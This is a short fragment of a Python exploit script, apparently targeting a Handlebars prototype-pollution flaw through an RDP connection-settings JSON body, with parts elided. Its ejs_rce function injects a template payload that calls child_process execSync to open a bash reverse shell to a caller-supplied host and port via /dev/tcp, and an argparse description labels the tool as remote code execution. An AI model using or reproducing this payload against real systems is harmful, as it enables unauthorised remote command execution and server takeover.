...
def ejs_rce(lhost, lport):
    ...
    json={"connection": {"settings": {"__proto__": {"body": [{"loc": 0, "params": [{"type": "NumberLiteral", "value": f"console.log(process.mainModule.require('child_process').execSync('bash -c \"exec bash -i &>/dev/tcp/{lhost}/{lport} <&1\"').toString())"}], "path": 0, "type": "MustacheStatement"}], "type": "Program"}, "client-name": "", "console": "false", "hostname": "rdesktop", "ignore-cert": "true", "initial-program": "", "password": "abc", "port": "3389", "security": "any", "username": "abc"}, "type": "rdp"}}
    try:
...
def main():
    parser = argparse.ArgumentParser(description="Handlebars (HBS) Prototype Pollution — Remote Code Execution")
